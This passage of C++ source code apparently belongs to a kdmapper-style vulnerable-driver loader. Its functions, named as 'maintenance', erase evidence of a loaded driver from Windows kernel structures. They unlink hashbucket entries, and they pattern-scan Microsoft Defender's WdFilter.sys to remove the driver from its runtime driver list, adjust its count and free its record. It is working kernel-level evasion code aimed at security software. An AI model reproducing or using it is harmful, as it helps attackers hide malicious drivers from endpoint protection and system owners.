                if (!kmem::WriteU64(backend, prev, next)) break;
                kmem::Trace("maintenance: hashbucket entry unlinked");
                const auto freeStatus = KFreePool(backend, entry);
                if (freeStatus != kmem::KernelCallStatus::Executed) {
                    if (freeStatus == kmem::KernelCallStatus::RestorationUncertain) {
                        resource.MarkKernelStateUncertain();
                    } else if (!kmem::WriteU64(backend, prev, entry)) {
                        resource.MarkKernelStateUncertain();
                    }
                    break;
                }
                processed = true;
                break;
            }

            prev = entry;
            if (!kmem::ReadU64(backend, entry, entry)) break;
        }
    }

    if (!resource.Release()) {
        std::wcerr << L"[hinv::maintenance] Failed to release g_HashCacheLock\n";
        return false;
    }

    if (processed) std::wcout << L"[hinv::maintenance] g_KernelHashBucketList processed for " << driverName << L"\n";
    return processed;
}

// ---------------------------------------------------------------------------
// WdFilter runtime driver list — kdmapper patterns (skipped when not loaded)
// ---------------------------------------------------------------------------

bool ProcessWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;

    uint64_t wdfBase = FindModuleBase(L"wdfilter.sys");
    if (!wdfBase) {
        std::cout << "[hinv::maintenance] WdFilter.sys not loaded, nothing to process\n";
        return false; // absence is not success: the caller must know nothing was removed
    }

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, wdfBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // RuntimeDriversList: 48 8B 0D ?? ?? ?? ?? FF 05
    uint64_t listRef = 0;
    {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x0D, 0, 0, 0, 0, 0xFF, 0x05 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 1 };
        listRef = FindPattern(backend, pageVa, pageSize, pat, msk);
    }
    // RuntimeDriversCount: FF 05 ?? ?? ?? ?? 48 39 11
    uint64_t countRef = 0;
    {
        std::vector<uint8_t> pat = { 0xFF, 0x05, 0, 0, 0, 0, 0x48, 0x39, 0x11 };
        std::vector<bool>   msk = { 1, 1, 0, 0, 0, 0, 1, 1, 1 };
        countRef = FindPattern(backend, pageVa, pageSize, pat, msk);
    }
    // MpFreeDriverInfoEx reference: two pattern variants ending in E8 .. E9.
    // kdmapper offsets: pattern 1 has the call at match+3, pattern 2 at +6 —
    // each branch applies its own adjustment, there is no shared extra +3.
    uint64_t freeRef = 0;
    {
        std::vector<uint8_t> pat = { 0x89, 0, 0x08, 0xE8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xE9 };
        std::vector<bool>   msk = { 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
        freeRef = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (freeRef) {
            freeRef += 0x3; // E8 at match+3
        } else {
            std::vector<uint8_t> pat2 = { 0x89, 0, 0x08, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xE9 };
            std::vector<bool>   msk2 = { 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
            freeRef = FindPattern(backend, pageVa, pageSize, pat2, msk2);
            if (freeRef) freeRef += 0x3 + 0x3; // E8 at match+6
        }
    }

    if (!listRef || !countRef || !freeRef) {
        std::wcerr << L"[hinv::maintenance] WdFilter globals not located on this build\n";
        return false;
    }

    // The pattern matches themselves must be inside WdFilter's image — a false
    // positive on an incompatible build must never become a wild kernel read.
    if (!IsInModule(wdfBase, listRef) || !IsInModule(wdfBase, countRef) || !IsInModule(wdfBase, freeRef)) {
        std::wcerr << L"[hinv::maintenance] WdFilter pattern match outside image, aborting\n";
        return false;
    }

    // Resolve the relative references (kdmapper offsets).
    uint64_t runtimeDriversList = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, listRef + 3, rel)) return false;
        runtimeDriversList = listRef + 7 + static_cast<int32_t>(rel);
    }
    uint64_t runtimeDriversCount = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, countRef + 2, rel)) return false;
        runtimeDriversCount = countRef + 6 + static_cast<int32_t>(rel);
    }
    uint64_t mpFreeDriverInfoEx = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, freeRef + 1, rel)) return false;
        mpFreeDriverInfoEx = freeRef + 5 + static_cast<int32_t>(rel);
    }
    // All resolved addresses must live inside WdFilter's image; a bad pattern
    // match must never turn into a wild kernel call. This validation happens
    // BEFORE any pointer derived from them is dereferenced.
    if (!IsInModule(wdfBase, runtimeDriversList) || !IsInModule(wdfBase, runtimeDriversCount) ||
        !IsInModule(wdfBase, mpFreeDriverInfoEx)) {
        std::wcerr << L"[hinv::maintenance] WdFilter resolution out of image range, aborting\n";
        return false;
    }

    uint64_t runtimeDriversListHead = runtimeDriversList - 0x8;
    uint64_t runtimeDriversArray = runtimeDriversCount + 0x8;
    if (!kmem::ReadU64(backend, runtimeDriversArray, runtimeDriversArray)) return false;

    std::wstring fileName = ToLower(driverName);
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    uint64_t entry = 0;
    if (!kmem::ReadU64(backend, runtimeDriversListHead, entry) || !entry) return false;

    // Cap the walk and detect cycles: a corrupted list must never hang
    // usermode while an exclusive kernel structure is being edited.
    std::unordered_set<uint64_t> visited;
    for (int iterations = 0; entry != runtimeDriversListHead; ++iterations) {
        if (iterations >= 4096 || !visited.insert(entry).second) {
            std::wcerr << L"[hinv::maintenance] WdFilter list cycle/length limit reached, aborting\n";
            return false;
        }
        UNICODE_STRING us{};
        if (!backend->ReadKernelMemory(entry + 0x10, &us, sizeof(us)) || !us.Buffer || !us.Length) break;

        std::vector<wchar_t> nameBuf(us.Length / 2 + 1, 0);
        if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(us.Buffer), nameBuf.data(), us.Length)) break;

        std::wstring entryName = ToLower(nameBuf.data());
        // Exact match only (see PiDDB/hashbucket notes on substring hazards).
        if (entryName != fileName && (stem.empty() || entryName != stem)) {
            if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), entry)) break;
            if (!entry) break;
            continue;
        }

        uint64_t next = 0, prev = 0;
        if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), next) ||
            !kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Blink), prev) ||
            !next || !prev)
            return false;
        uint64_t nextPrev = 0, prevNext = 0;
        if (!kmem::ReadU64(backend, next + offsetof(LIST_ENTRY, Blink), nextPrev) ||
            !kmem::ReadU64(backend, prev + offsetof(LIST_ENTRY, Flink), prevNext) ||
            nextPrev != entry || prevNext != entry)
            return false;

        // Find the array slot first, but do not modify it until the list
        // unlink has been completed. Every intermediate write has a complete
        // rollback path while the entry is still allocated.
        uint64_t sameIndexList = entry - 0x10;
        uint64_t arraySlot = 0;
        uint64_t oldArrayValue = 0;
        bool removedFromArray = false;
        for (int k = 0; k < 256; ++k) {
            uint64_t value = 0;
            if (!kmem::ReadU64(backend, runtimeDriversArray + k * 8, value)) break;
            if (value == sameIndexList) {
                arraySlot = runtimeDriversArray + k * 8;
                oldArrayValue = value;
                removedFromArray = true;
                break;
            }
        }
        if (!removedFromArray) return false;

        uint32_t oldCount = 0;
        if (!kmem::ReadU32(backend, runtimeDriversCount, oldCount) || oldCount == 0)
            return false;

        bool listChanged = false;
        bool arrayChanged = false;
        auto rollback = [&]() {
            bool ok = true;
            if (arrayChanged)
                ok = kmem::WriteU64(backend, arraySlot, oldArrayValue) && ok;
            if (listChanged) {
                ok = kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), entry) && ok;
                ok = kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry) && ok;
            }
            return ok;
        };

        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev))
            return false;
        listChanged = true;
        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next)) {
            if (!rollback()) return false;
            return false;
        }

        const uint64_t emptyVal = runtimeDriversCount + 1; // position marker
        if (!kmem::WriteU64(backend, arraySlot, emptyVal)) {
            if (!rollback()) return false;
            return false;
        }
        arrayChanged = true;

        if (!kmem::WriteU32(backend, runtimeDriversCount, oldCount - 1)) {
            if (!rollback() || !kmem::WriteU32(backend, runtimeDriversCount, oldCount))
                return false;
            return false;
        }

        // Release the driver info block only when the magic matches; kdmapper
        // skips the free on mismatch to avoid a bugcheck on new WdFilter builds.
        uint64_t driverInfo = entry - 0x20;
        uint16_t magic = 0;
        if (backend->ReadKernelMemory(driverInfo, &magic, sizeof(magic)) && magic == 0xDA18) {
            kmem::Trace("maintenance: wdfilter MpFreeDriverInfoEx call");
            const auto freeStatus = kmem::CallKernelFunction<void>(
                backend, nullptr, mpFreeDriverInfoEx, driverInfo);
            if (freeStatus != kmem::KernelCallStatus::Executed) {
                if (freeStatus == kmem::KernelCallStatus::RestorationUncertain)
                    return false;
                if (!rollback() || !kmem::WriteU32(backend, runtimeDriversCount, oldCount))
                    return false;
                return false;
            }
        } else {
            std::wcerr << L"[hinv::maintenance] WdFilter DriverInfo magic mismatch, free skipped\n";
        }

        std::wcout << L"[hinv::maintenance] WdFilterDriverList processed: " << nameBuf.data() << L"\n";
        return true;
    }

    return false;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

MaintenanceResult ProcessDriverTraces(byovd::IByovdBackend* backend, const std::wstring& driverName,
                                      uint32_t driverFileTimestamp) {
    MaintenanceResult result{};
    if (!backend) {
        result.error = L"invalid backend";
        return result;
    }

    const auto os = kmem::GetOsVersion();
    if (os.major != 10 || !IsSupportedMaintenanceBuild(os.build)) {
        result.error = L"unsupported Windows build; refusing build-specific kernel pattern scans";
        return result;
    }

    std::wcout << L"[hinv::maintenance] Processing traces for " << driverName << L"\n";
    for (const auto& module : kmem::EnumKernelModules()) {
        if (ToLower(module.name) == L"wdfilter.sys") {
            result.wdFilterPresent = true;
            break;
        }
    }
    kmem::Trace("maintenance: begin (piddb)");
    result.piDdbCache = ProcessPiDddbCache(backend, driverName, driverFileTimestamp);
    if (!kmem::KernelCallsUsable()) {
        result.error = L"kernel-call restoration is uncertain; later maintenance operations were not started";
        return result;
    }
    kmem::Trace("maintenance: begin (hashbucket)");
    result.hashBucketList = ProcessKernelHashBucketList(backend, driverName);
    if (!kmem::KernelCallsUsable()) {
        result.error = L"kernel-call restoration is uncertain; later maintenance operations were not started";
        return result;
    }
    kmem::Trace("maintenance: begin (wdfilter)");
    result.wdFilter = ProcessWdFilterDriverList(backend, driverName);
    kmem::Trace("maintenance: all done");
    if (!kmem::KernelCallsUsable())
        result.error = L"kernel-call restoration is uncertain; teardown is blocked";

    result.complete = result.piDdbCache && result.hashBucketList &&
                      (!result.wdFilterPresent || result.wdFilter);
    if (!result.piDdbCache && !result.hashBucketList && !result.wdFilter) {
        result.error = L"no matching entries found (already processed?) or globals not located on this build; see log";
    } else if (!result.complete) {
        result.error = L"partial trace processing; one or more structures were not confirmed";
    }
    return result;
}

} // namespace maintenance
} // namespace hinv
